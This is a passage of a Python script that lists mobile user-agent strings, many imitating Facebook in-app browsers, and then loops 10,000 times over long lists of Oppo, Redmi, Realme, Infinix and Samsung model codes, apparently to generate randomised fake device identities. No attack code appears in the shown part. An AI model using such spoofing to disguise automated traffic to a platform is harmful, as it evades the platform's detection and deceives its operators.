    'Mozilla/5.0 (Linux; Android 9; MAR-LX1A Build/HUAWEIMAR-L21A; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.163 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/426.0.0.26.50;]']
ua = [
    'Mozilla/5.0 (iPhone; CPU iPhone OS 15_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/19D52']
ua = [
    'Mozilla/5.0 (Linux; Android 8.0.0; SM-J330G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.58 Mobile Safari/537.36']
ua = [
    'Mozilla/5.0 (Linux; Android 10; M2006C3LG Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/98.0.4758.101 Mobile Safari/537.36']
ua = [
    'Mozilla/5.0 (Linux; Android 11; moto g(40) fusion Build/RRI31.Q1-42-51-12; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36']
ua = [
    'Mozilla/5.0 (Linux; Android 6.0; CAM-UL00 Build/HONORCAM-UL00; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/106.0.5249.126 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/430.0.0.23.113;]']
ua = [
    'Mozilla/5.0 (Linux; Android 6.0.1; SM-J700M Build/MMB29K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/106.0.5249.126 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/417.0.0.33.65;]']
ua = [
    'Mozilla/5.0 (Linux; Android 8.1.0; SM-J710F Build/M1AJQ; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.86 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/391.1.0.37.104;]']
ua = [
    'Mozilla/5.0 (Linux; Android 11; RMX3201) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Mobile Safari/537.36']
ua = [
    'Mozilla/5.0 (Linux; Android 7.0; MS50L Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/429.0.0.27.114;]']
ua = [
    'Mozilla/5.0 (Linux; Android 5.0.2; HTC Desire Eye Build/LRX22G; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/95.0.4638.74 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/351.1.0.12.114;]']
ua = [
    'Mozilla/5.0 (Linux; Android 11; V1936A Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.106 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/326.9.0.13.112;]']
ua = [
    'Mozilla/5.0 (iPhone; CPU iPhone OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Mobile/12H321 [FBAN/FBIOS;FBAV/38.0.0.6.79;FBBV/14316658;FBDV/iPhone7,1;FBMD/iPhone;FBSN/iPhone OS;FBSV/8.4.1;FBSS/3; FBCR/csl.;FBID/phone;FBLC/en_US;FBOP/5]']
ua = [
    'Mozilla/5.0 (Linux; Android 11; 21061119DG Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/113.0.5672.76 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/414.0.0.30.113;]']
ua = [
    'Mozilla/5.0 (Linux; Android 11; 21061119DG Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.196 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/418.0.0.11.71;]']
ua = [
    'Mozilla/5.0 (Linux; Android 13; SM-A135M Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36']
ua = [
    'Mozilla/5.0 (Linux; Android 13; SM-A137F Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.166 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/428.0.0.26.108;]']
ua = [
    'Mozilla/5.0 (Linux; Android 12; SM-N970F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/400.0.0.11.90;]']
ua = [
    'Mozilla/5.0 (Linux; Android 11; SM-G986B) AppleWebKit/537.36 (KHTML, like Gecko) Stargon/5.1.1 Chrome/114.0.5735.61 Mobile Safari/537.36']
ua = [
    'Mozilla/5.0 (Linux; Android 13; SM-G986B Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.177 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/427.0.0.31.63;]']
ua = [
    'Mozilla/5.0 (Linux; Android 10; SM-J400F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.141 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/396.1.0.28.104;']
ua = [
    'Mozilla/5.0 (Linux; Android 10; SM-J400M Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36[FBAN/EMA;FBLC/pt_BR;FBAV/350.0.0.5.116;]']
ua = [
    'Mozilla/5.0 (Linux; Android 10; SM-J400F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.58 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/401.0.0.14.97;']
ua = [
    'Mozilla/5.0 (Linux; Android 11; SM-A505W Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.196 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/424.0.0.21.75;]']
ua = [
    'Mozilla/5.0 (Linux; Android 11; 220333QPG Build/RD2A.211001.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/97.0.4692.98 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/418.0.0.33.69;]']
ua = [
    'Mozilla/5.0 (Linux; Android 11; 220333QPG Build/RD2A.211001.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.227 Mobile Safari/537']
ua = [
    'Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/20A5356a [FBAN/FBIOS;FBDV/iPhone10,5;FBMD/iPhone;FBSN/iOS;FBSV/16.0;FBSS/3;FBID/phone;FBLC/en_GB;FBOP/5]']
ua = [
    'Mozilla/5.0 (Linux; Android 10; itel L6502 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/104.0.5112.97 Mobile Safari/537.36[FBAN/EMA;FBLC/id_ID;FBAV/320.0.0.12.108;]']
ua = [
    'Mozilla/5.0 (Linux; Android 10; itel L6502 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/380.0.0.29.109;]']
ua = [
    'Mozilla/5.0 (Linux; Android 10; itel L6502 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/372.0.0.10.112;]']
ua = [
    'Mozilla/5.0 (Linux; Android 10; Infinix X682C Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.79 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/345.0.0.8.69;]']
ua = [
    'Mozilla/5.0 (Linux; Android 10; Infinix X682C Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.58 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/405.1.0.28.72;]']
ua = [
    'Mozilla/5.0 (Linux; Android 10; Infinix X682B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Mobile Safari/537.36']
ua = [
    'Mozilla/5.0 (Linux; Android 9; CPH2083 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.45 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/390.0.0.27.105;]']
ua = [
    'Mozilla/5.0 (Linux; Android 9; CPH2083 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/93.0.4577.82 Mobile Safari/537.36[FBAN/EMA;FBLC/id_ID;FBAV/318.0.0.16.105;]']
ua = [
    'Mozilla/5.0 (Linux; Android 9; CPH2083) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Mobile Safari/537.36']
ua = [
    'Mozilla/5.0 (Linux; Android 11; XIAOMI POCO X2 Build/NMF26F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.96 Mobile Safari/537.36 AlohaBrowser/3.0.4']
ua = [
    'Mozilla/5.0 (Linux; Android 12; RMX3286 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/113.0.5672.162 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/418.0.0.33.69;]']
ua = [
    'Mozilla/5.0 (Linux; Android 12; RMX3286 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/113.0.5672.162 Mobile Safari/537.36']
ua = [
    'Mozilla/5.0 (Linux; Android 11; RMX3286 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/113.0.5672.162 Mobile Safari/537.36[FBAN/EMA;FBLC/id_ID;FBAV/357.0.0.12.72;]']
ua = [
    'Mozilla/5.0 (Linux; Android 11; SM-A107F Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.131 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/420.0.0.32.61;]']
ua = [
    'Mozilla/5.0 (Linux; Android 11; SM-A107F Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.196 Mobile Safari/537.36[FBAN/EMA;FBLC/en_GB;FBAV/362.0.0.10.67;]']
ua = [
    'Mozilla/5.0 (Linux; Android 11; SM-A107M Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;]']
ua = [
    'Mozilla/5.0 (Linux; Android 13; CPH2481 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.136 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/411.1.0.29.112;]']
ua = [
    'Mozilla/5.0 (Linux; Android 10; FRL-L23 Build/HUAWEIFRL-L23; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.93 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/353.0.0.34.116;]']
ua = [
    'Mozilla/5.0 (Linux; Android 10; FRL-L23; HMSCore 6.8.0.331) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.105 HuaweiBrowser/12.1.3.304 Mobile Safari/537.36']
ua = [
    'Mozilla/5.0 (Linux; Android 12; RMX3085 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]']
ua = [
    'Mozilla/5.0 (Linux; Android 12; RMX3085 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/395.0.0.10.75;]']
ua = [
    'Mozilla/5.0 (Linux; Android 11; SM-E225F Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/355.0.0.21.108;]']
ua = [
    'Mozilla/5.0 (Linux; Android 13; SM-E225F Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.79 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;]']
ua = [
    'Mozilla/5.0 (Linux; Android 13; SM-A135M Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36']
ua = [
    'Mozilla/5.0 (Linux; Android 13; SM-A137F Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.196 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/428.0.0.26.108;]']
for xd in range(10000):
    build_nokiax = [
        'JDQ39',
        'JZO54K']
    oppo = [
        'CPH1869',
        'CPH1929',
        'CPH2107',
        'CPH2238',
        'CPH2389',
        'CPH2401',
        'CPH2407',
        'CPH2413',
        'CPH2415',
        'CPH2417',
        'CPH2419',
        'CPH2455',
        'CPH2459',
        'CPH2461',
        'CPH2471',
        'CPH2473',
        'CPH2477',
        'CPH8893',
        'CPH2321',
        'CPH2341',
        'CPH2373',
        'CPH2083',
        'CPH2071',
        'CPH2077',
        'CPH2185',
        'CPH2179',
        'CPH2269',
        'CPH2421',
        'CPH2349',
        'CPH2271',
        'CPH1923',
        'CPH1925',
        'CPH1837',
        'CPH2015',
        'CPH2073',
        'CPH2081',
        'CPH2029',
        'CPH2031',
        'CPH2137',
        'CPH1605',
        'CPH1803',
        'CPH1853',
        'CPH1805',
        'CPH1809',
        'CPH1851',
        'CPH1931',
        'CPH1959',
        'CPH1933',
        'CPH1935',
        'CPH1943',
        'CPH2061',
        'CPH2069',
        'CPH2127',
        'CPH2131',
        'CPH2139',
        'CPH2135',
        'CPH2239',
        'CPH2195',
        'CPH2273',
        'CPH2325',
        'CPH2309',
        'CPH1701',
        'CPH2387',
        'CPH1909',
        'CPH1920',
        'CPH1912',
        'CPH1901',
        'CPH1903',
        'CPH1905',
        'CPH1717',
        'CPH1801',
        'CPH2067',
        'CPH2099',
        'CPH2161',
        'CPH2219',
        'CPH2197',
        'CPH2263',
        'CPH2375',
        'CPH2339',
        'CPH1715',
        'CPH2385',
        'CPH1729',
        'CPH1827',
        'CPH1938',
        'CPH1937',
        'CPH1939',
        'CPH1941',
        'CPH2001',
        'CPH2021',
        'CPH2059',
        'CPH2121',
        'CPH2123',
        'CPH2203',
        'CPH2333',
        'CPH2365',
        'CPH1913',
        'CPH1911',
        'CPH1915',
        'CPH1969',
        'CPH2209',
        'CPH1987',
        'CPH2095',
        'CPH2119',
        'CPH2285',
        'CPH2213',
        'CPH2223',
        'CPH2363',
        'CPH1609',
        'CPH1613',
        'CPH1723',
        'CPH1727',
        'CPH1725',
        'CPH1819',
        'CPH1821',
        'CPH1825',
        'CPH1881',
        'CPH1823',
        'CPH1871',
        'CPH1875',
        'CPH2023',
        'CPH2005',
        'CPH2025',
        'CPH2207',
        'CPH2173',
        'CPH2307',
        'CPH2305',
        'CPH2337',
        'CPH1955',
        'CPH1707',
        'CPH1719',
        'CPH1721',
        'CPH1835',
        'CPH1831',
        'CPH1833',
        'CPH1879',
        'CPH1893',
        'CPH1877',
        'CPH1607',
        'CPH1611',
        'CPH1917',
        'CPH1919',
        'CPH1907',
        'CPH1989',
        'CPH1945',
        'CPH1951',
        'CPH2043',
        'CPH2035',
        'CPH2037',
        'CPH2036',
        'CPH2009',
        'CPH2013',
        'CPH2113',
        'CPH2091',
        'CPH2125',
        'CPH2109',
        'CPH2089',
        'CPH2065',
        'CPH2159',
        'CPH2145',
        'CPH2205',
        'CPH2201',
        'CPH2199',
        'CPH2217',
        'CPH1921',
        'CPH2211',
        'CPH2235',
        'CPH2251',
        'CPH2249',
        'CPH2247',
        'CPH2237',
        'CPH2371',
        'CPH2293',
        'CPH2353',
        'CPH2343',
        'CPH2359',
        'CPH2357',
        'CPH2457',
        'CPH1983',
        'CPH1979']
    redmi = [
        '2201116SI',
        'M2012K11AI',
        '22011119TI',
        '21091116UI',
        'M2102K1AC',
        'M2012K11I',
        '22041219I',
        '22041216I',
        '2203121C',
        '2106118C',
        '2201123G',
        '2203129G',
        '2201122G',
        '2201122C',
        '2206122SC',
        '22081212C',
        '2112123AG',
        '2112123AC',
        '2109119BC',
        'M2002J9G',
        'M2007J1SC',
        'M2007J17I',
        'M2102J2SC',
        'M2007J3SY',
        'M2007J17G',
        'M2007J3SG',
        'M2011K2G',
        'M2101K9AG ',
        'M2101K9R',
        '2109119DG',
        'M2101K9G',
        '2109119DI',
        'M2012K11G',
        'M2102K1G',
        '21081111RG',
        '2107113SG',
        '21051182G',
        'M2105K81AC',
        'M2105K81C',
        '21061119DG',
        '21121119SG',
        '22011119UY',
        '21061119AG',
        '21061119AL',
        '22041219NY',
        '22041219G',
        '21061119BI',
        '220233L2G',
        '220233L2I',
        '220333QNY',
        '220333QAG',
        'M2004J7AC',
        'M2004J7BC',
        'M2004J19C',
        'M2006C3MII',
        'M2010J19SI',
        'M2006C3LG',
        'M2006C3LVG',
        'M2006C3MG',
        'M2006C3MT',
        'M2006C3MNG',
        'M2006C3LII',
        'M2010J19SL',
        'M2010J19SG',
        'M2010J19SY',
        'M2012K11AC',
        'M2012K10C',
        'M2012K11C',
        '22021211RC']
    realme = [
        'RMX3516',
        'RMX3371',
        'RMX3461',
        'RMX3286',
        'RMX3561',
        'RMX3388',
        'RMX3311',
        'RMX3142',
        'RMX2071',
        'RMX1805',
        'RMX1809',
        'RMX1801',
        'RMX1807',
        'RMX1803',
        'RMX1825',
        'RMX1821',
        'RMX1822',
        'RMX1833',
        'RMX1851',
        'RMX1853',
        'RMX1827',
        'RMX1911',
        'RMX1919',
        'RMX1927',
        'RMX1971',
        'RMX1973',
        'RMX2030',
        'RMX2032',
        'RMX1925',
        'RMX1929',
        'RMX2001',
        'RMX2061',
        'RMX2063',
        'RMX2040',
        'RMX2042',
        'RMX2002',
        'RMX2151',
        'RMX2163',
        'RMX2155',
        'RMX2170',
        'RMX2103',
        'RMX3085',
        'RMX3241',
        'RMX3081',
        'RMX3151',
        'RMX3381',
        'RMX3521',
        'RMX3474',
        'RMX3471',
        'RMX3472',
        'RMX3392',
        'RMX3393',
        'RMX3491',
        'RMX1811',
        'RMX2185',
        'RMX3231',
        'RMX2189',
        'RMX2180',
        'RMX2195',
        'RMX2101',
        'RMX1941',
        'RMX1945',
        'RMX3063',
        'RMX3061',
        'RMX3201',
        'RMX3203',
        'RMX3261',
        'RMX3263',
        'RMX3193',
        'RMX3191',
        'RMX3195',
        'RMX3197',
        'RMX3265',
        'RMX3268',
        'RMX3269',
        'RMX2027',
        'RMX2020',
        'RMX2021',
        'RMX3581',
        'RMX3501',
        'RMX3503',
        'RMX3511',
        'RMX3310',
        'RMX3312',
        'RMX3551',
        'RMX3301',
        'RMX3300',
        'RMX2202',
        'RMX3363',
        'RMX3360',
        'RMX3366',
        'RMX3361',
        'RMX3031',
        'RMX3370',
        'RMX3357',
        'RMX3560',
        'RMX3562',
        'RMX3350',
        'RMX2193',
        'RMX2161',
        'RMX2050',
        'RMX2156',
        'RMX3242',
        'RMX3171',
        'RMX3430',
        'RMX3235',
        'RMX3506',
        'RMX2117',
        'RMX2173',
        'RMX3161',
        'RMX2205',
        'RMX3462',
        'RMX3478',
        'RMX3372',
        'RMX3574',
        'RMX1831',
        'RMX3121',
        'RMX3122',
        'RMX3125',
        'RMX3043',
        'RMX3042',
        'RMX3041',
        'RMX3092',
        'RMX3093',
        'RMX3571',
        'RMX3475',
        'RMX2200',
        'RMX2201',
        'RMX2111',
        'RMX2112',
        'RMX1901',
        'RMX1903',
        'RMX1992',
        'RMX1993',
        'RMX1991',
        'RMX1931',
        'RMX2142',
        'RMX2081',
        'RMX2085',
        'RMX2083',
        'RMX2086',
        'RMX2144',
        'RMX2051',
        'RMX2025',
        'RMX2075',
        'RMX2076',
        'RMX2072',
        'RMX2052',
        'RMX2176',
        'RMX2121',
        'RMX3115',
        'RMX1921']
    infinix = [
        'X676B',
        'X687',
        'X609',
        'X697',
        'X680D',
        'X507',
        'X605',
        'X668',
        'X6815B',
        'X624',
        'X655F',
        'X689C',
        'X608',
        'X698',
        'X682B',
        'X682C',
        'X688C',
        'X688B',
        'X658E',
        'X659B',
        'X689B',
        'X689',
        'X689D',
        'X662',
        'X662B',
        'X675',
        'X6812B',
        'X6812',
        'X6817B',
        'X6817',
        'X6816C',
        'X6816',
        'X6816D',
        'X668C',
        'X665B',
        'X665E',
        'X510',
        'X559C',
        'X559F',
        'X559',
        'X606',
        'X606C',
        'X606D',
        'X623',
        'X624B',
        'X625C',
        'X625D',
        'X625B',
        'X650D',
        'X650B',
        'X650',
        'X650C',
        'X655C',
        'X655D',
        'X680B',
        'X573',
        'X573B',
        'X622',
        'X693',
        'X695C',
        'X695D',
        'X695',
        'X663B',
        'X663',
        'X670',
        'X671',
        'X671B',
        'X672',
        'X6819',
        'X572',
        'X572-LTE',
        'X571',
        'X604',
        'X610B',
        'X690',
        'X690B',
        'X656',
        'X692',
        'X683',
        'X450',
        'X5010',
        'X501',
        'X401',
        'X626',
        'X626B',
        'X652',
        'X652A',
        'X652B',
        'X652C',
        'X660B',
        'X660C',
        'X660',
        'X5515',
        'X5515F',
        'X5515I',
        'X609B',
        'X5514D',
        'X5516B',
        'X5516C',
        'X627',
        'X680',
        'X653',
        'X653C',
        'X657',
        'X657B',
        'X657C',
        'X6511B',
        'X6511E',
        'X6511',
        'X6512',
        'X6823C',
        'X612B',
        'X612',
        'X503',
        'X511',
        'X352',
        'X351',
        'X530',
        'X676C',
        'X6821',
        'X6823',
        'X6827',
        'X509',
        'X603',
        'X6815',
        'X620B',
        'X620',
        'X687B',
        'X6811B',
        'X6810',
        'X6811']
    samsung = [
        'E025F',
        'G996B',
        'A826S',
        'E135F',
        'G781B',
        'G998B',
        'F936U1',
        'G361F',
        'A716S',
        'J327AZ',
        'E426B',
        'A015F',
        'A015M',
        'A013G',
        'A013G',
        'A013M',
        'A013F',
        'A022M',
        'A022G',
        'A022F',
        'A025M',
        'S124DL',
        'A025U',
        'A025A',
        'A025G',
        'A025F',
        'A025AZ',
        'A035F',
        'A035M',
        'A035G',
        'A032F',
        'A032M',
        'A032F',
        'A037F',
        'A037U',
        'A037M',
        'S134DL',
        'A037G',
        'A105G',
        'A105M',
        'A105F',
        'A105FN',
        'A102U',
        'S102DL',
        'A102U1',
        'A107F',
        'A107M',
        'A115AZ',
        'A115U',
        'A115U1',
        'A115A',
        'A115M',
        'A115F',
        'A125F',
        'A127F',
        'A125M',
        'A125U',
        'A127M',
        'A135F',
        'A137F',
        'A135M',
        'A136U',
        'A136U1',
        'A136W',
        'A260F',
        'A260G',
        'A260F',
        'A260G',
        'A205GN',
        'A205U',
        'A205F',
        'A205G',
        'A205FN',
        'A202F',
        'A2070',
        'A207F',
        'A207M',
        'A215U',
        'A215U1',
        'A217F',
        'A217F',
        'A217M',
        'A225F',
        'A225M',
        'A226B',
        'A226B',
        'A226BR',
        'A235F',
        'A235M',
        'A300FU',
        'A300F',
        'A300H',
        'A310F',
        'A310M',
        'A320FL',
        'A320F',
        'A305G',
        'A305GT',
        'A305N',
        'A305F',
        'A307FN',
        'A307G',
        'A307GN',
        'A315G',
        'A315F',
        'A325F',
        'A325M',
        'A326U',
        'A326W',
        'A336E',
        'A336B',
        'A430F',
        'A405FN',
        'A405FM',
        'A3051',
        'A3050',
        'A415F',
        'A426U',
        'A426B',
        'A5009',
        'A500YZ',
        'A500Y',
        'A500W',
        'A500L',
        'A500X',
        'A500XZ',
        'A510F',
        'A510Y',
        'A520F',
        'A520W',
        'A500F',
        'A500FU',
        'A500H',
        'S506DL',
        'A505G',
        'A505FN',
        'A505U',
        'A505GN',
        'A505F',
        'A507FN',
        'A5070',
        'A515F',
        'A515U',
        'A515U1',
        'A516U',
        'A516V',
        'A516N',
        'A516B',
        'A525F',
        'A525M',
        'A526U',
        'A526U1',
        'A526B',
        'A526W',
        'A528B',
        'A536B',
        'A536U',
        'A536E',
        'A536V',
        'A600FN',
        'A600G',
        'A605FN',
        'A605G',
        'A605GN',
        'A605F',
        'A6050',
        'A606Y',
        'A6060',
        'G6200',
        'A700FD',
        'A700F',
        'A7000',
        'A700H',
        'A700YD',
        'A710F',
        'A710M',
        'A720F',
        'A750F',
        'A750FN',
        'A750GN',
        'A705FN',
        'A705F',
        'A705MN',
        'A707F',
        'A715F',
        'A715W',
        'A716U',
        'A716V',
        'A716U1',
        'A716B',
        'A725F',
        'A725M',
        'A736B',
        'A530F',
        'A810YZ',
        'A810F',
        'A810S',
        'A530W',
        'A530N',
        'G885F',
        'G885Y',
        'G885S',
        'A730F',
        'A805F',
        'G887F',
        'G8870',
        'A9000',
        'A920F',
        'A920F',
        'G887N',
        'A910F',
        'G8850',
        'A908B',
        'A908N',
        'A9080',
        'G313HY',
        'G313MY',
        'G313MU',
        'G316M',
        'G316ML',
        'G316MY',
        'G313HZ',
        'G313H',
        'G313HU',
        'G313U',
        'G318H',
        'G357FZ',
        'G310HN',
        'G357FZ',
        'G850F',
        'G850M',
        'J337AZ',
        'G386T1',
        'G386T',
        'G3858',
        'G3858',
        'A226L',
        'C5000',
        'C500X',
        'C5010',
        'C5018',
        'C7000',
        'C7010',
        'C701F',
        'C7018',
        'C7100',
        'C7108',
        'C9000',
        'C900F',
        'C900Y',
        'G355H',
        'G355M',
        'G3589W',
        'G386W',
        'G386F',
        'G3518',
        'G3586V',
        'G5108Q',
        'G5108',
        'G3568V',
        'G350E',
        'G350',
        'G3509I',
        'G3508J',
        'G3502I',
        'G3502C',
        'S820L',
        'G360H',
        'G360F',
        'G360T',
        'G360M',
        'G361H',
        'E500H',
        'E500F',
        'E500M',
        'E5000',
        'E500YZ',
        'E700H',
        'E700F',
        'E7009',
        'E700M',
        'G3815',
        'G3815',
        'G3815',
        'F127G',
        'E225F',
        'E236B',
        'F415F',
        'E5260',
        'E625F',
        'F900U',
        'F907N',
        'F900F',
        'F9000',
        'F907B',
        'F900W',
        'G150NL',
        'G155S',
        'G1650',
        'W2015',
        'G7102',
        'G7105',
        'G7106',
        'G7108',
        'G7202',
        'G720N0',
        'G7200',
        'G720AX',
        'G530T1',
        'G530H',
        'G530FZ',
        'G531H',
        'G530BT',
        'G532F',
        'G531BT',
        'G531M',
        'J727AZ',
        'J100FN',
        'J100H',
        'J120FN',
        'J120H',
        'J120F',
        'J120M',
        'J111M',
        'J111F',
        'J110H',
        'J110G',
        'J110F',
        'J110M',
        'J105H',
        'J105Y',
        'J105B',
        'J106H',
        'J106F',
        'J106B',
        'J106M',
        'J200F',
        'J200M',
        'J200G',
        'J200H',
        'J200F',
        'J200GU',
        'J260M',
        'J260F',
        'J260MU',
        'J260F',
        'J260G',
        'J200BT',
        'G532G',
        'G532M',
        'G532MT',
        'J250M',
        'J250F',
        'J210F',
        'J260AZ',
        'J3109',
        'J320A',
        'J320G',
        'J320F',
        'J320H',
        'J320FN',
        'J330G',
        'J330F',
        'J330FN',
        'J337V',
        'J337P',
        'J337A',
        'J337VPP',
        'J337R4',
        'J327VPP',
        'J327V',
        'J327P',
        'J327R4',
        'S327VL',
        'S337TL',
        'S367VL',
        'J327A',
        'J327T1',
        'J327T',
        'J3110',
        'J3119S',
        'J3119',
        'S320VL',
        'J337T',
        'J400M',
        'J400F',
        'J400F',
        'J410F',
        'J410G',
        'J410F',
        'J415FN',
        'J415F',
        'J415G',
        'J415GN',
        'J415N',
        'J500FN',
        'J500M',
        'J510MN',
        'J510FN',
        'J510GN',
        'J530Y',
        'J530F',
        'J530G',
        'J530FM',
        'G570M',
        'G570F',
        'G570Y',
        'J600G',
        'J600FN',
        'J600GT',
        'J600F',
        'J610F',
        'J610G',
        'J610FN',
        'J710F',
        'J700H',
        'J700M',
        'J700F',
        'J700P',
        'J700T',
        'J710GN',
        'J700T1',
        'J727A',
        'J727R4',
        'J737T',
        'J737A',
        'J737R4',
        'J737V',
        'J737T1',
        'J737S',
        'J737P',
        'J737VPP',
        'J701F',
        'J701M',
        'J701MT',
        'S767VL',
        'S757BL',
        'J720F',
        'J720M',
        'G615F',
        'G615FU',
        'G610F',
        'G610M',
        'G610Y',
        'G611MT',
        'G611FF',
        'G611M',
        'J730G',
        'J730GM',
        'J730F',
        'J730FM',
        'S727VL',
        'S737TL',
        'J727T1',
        'J727T1',
        'J727V',
        'J727P',
        'J727VPP',
        'J727T',
        'C710F',
        'J810M',
        'J810F',
        'J810G',
        'J810Y',
        'A605K',
        'A605K',
        'A202K',
        'M336K',
        'A326K',
        'C115',
        'C115L',
        'C1158',
        'C1158',
        'C115W',
        'C115M',
        'S120VL',
        'M015G',
        'M015F',
        'M013F',
        'M017F',
        'M022G',
        'M022F',
        'M022M',
        'M025F',
        'M105G',
        'M105M',
        'M105F',
        'M107F',
        'M115F',
        'M115F',
        'M127F',
        'M127G',
        'M135M',
        'M135F',
        'M135FU',
        'M205FN',
        'M205F',
        'M205G',
        'M215F',
        'M215G',
